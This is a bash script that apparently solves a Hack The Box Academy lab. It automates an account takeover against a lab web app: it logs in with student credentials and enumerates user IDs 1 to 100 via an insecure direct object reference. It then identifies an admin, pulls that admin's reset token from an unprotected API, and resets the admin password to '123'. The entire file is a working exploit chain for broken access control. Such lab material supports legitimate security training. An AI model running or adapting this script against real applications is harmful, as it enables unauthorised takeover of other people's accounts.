#!/bin/bash

# Check and install jq if needed
if ! command -v jq &> /dev/null; then
    echo "[*] Installing jq..."
    if [[ -f /etc/debian_version ]]; then
        sudo apt update && sudo apt install -y jq
    elif [[ -f /etc/redhat-release ]]; then
        sudo yum install -y jq
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        brew install jq
    else
        echo "[-] Please install jq manually and try again"
        exit 1
    fi
fi

# Target configuration
TARGET="http://94.237.55.43:50149"
LOGIN_URL="$TARGET/index.php"
CREDS="username=htb-student&password=Academy_student%21"

# Cookie management
COOKIE_FILE=$(mktemp)
trap 'rm -f "$COOKIE_FILE"' EXIT

echo "[*] Authenticating..."
curl -s -v -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: $TARGET/" \
  -d "$CREDS" \
  -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1

if [ ! -s "$COOKIE_FILE" ] || ! grep -q "PHPSESSID" "$COOKIE_FILE"; then
  echo "[-] Authentication failed!"
  exit 1
fi
echo "[+] Authenticated successfully"

# Scan all users and detect admin
echo -e "\n[*] Scanning all users (1-100)..."
declare -A USERS
ADMIN_UID=""

for id in {1..100}; do
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id")
    username=$(echo "$response" | grep -oP "username: \K.*")
    is_admin=$(echo "$response" | grep -oi "admin" | wc -l)
    
    if [[ -n "$username" ]]; then
        USERS["$id"]="$username"
        echo "[+] UID $id: $username"
        
        # Check for admin indicators (case insensitive)
        if [[ $is_admin -gt 0 ]] || 
           [[ "$response" =~ "role:admin" ]] || 
           [[ "$response" =~ "privilege:1" ]] ||
           [[ "$response" =~ "is_admin:true" ]]; then
            ADMIN_UID=$id
            echo "    ^--- ADMIN PRIVILEGES DETECTED!"
        fi
    fi
done

if [[ -z "$ADMIN_UID" ]]; then
    echo -e "\n[-] No admin user automatically detected. Possible admin UIDs based on naming:"
    for id in "${!USERS[@]}"; do
        if [[ "${USERS[$id]}" =~ root|sysadmin|superuser|administrator ]]; then
            echo "    UID $id: ${USERS[$id]} (possible admin)"
            ADMIN_UID=$id
        fi
    done
    
    if [[ -z "$ADMIN_UID" ]]; then
        echo -e "\n[-] No clear admin found. Please manually inspect the users above."
        exit 1
    fi
fi

echo -e "\n[*] Targeting UID $ADMIN_UID (${USERS[$ADMIN_UID]}) for token extraction..."
ADMIN_TOKEN=$(curl -s -b "$COOKIE_FILE" "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')

if [[ -z "$ADMIN_TOKEN" ]]; then
    echo "[-] Failed to get admin token"
    exit 1
fi
echo "[+] Admin Token: $ADMIN_TOKEN"

echo -e "\n[*] Attempting password reset..."
reset_response=$(curl -s -v -b "$COOKIE_FILE" \
  "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=123" 2>&1)

if echo "$reset_response" | grep -qi "success"; then
    echo -e "\n[+] PASSWORD RESET SUCCESSFUL!"
    echo "    Admin UID: $ADMIN_UID"
    echo "    Username: ${USERS[$ADMIN_UID]}"
    echo "    New password: 123"
else
    echo -e "\n[-] Password reset may have failed. Server response:"
    echo "$reset_response" | head -n 20
fi
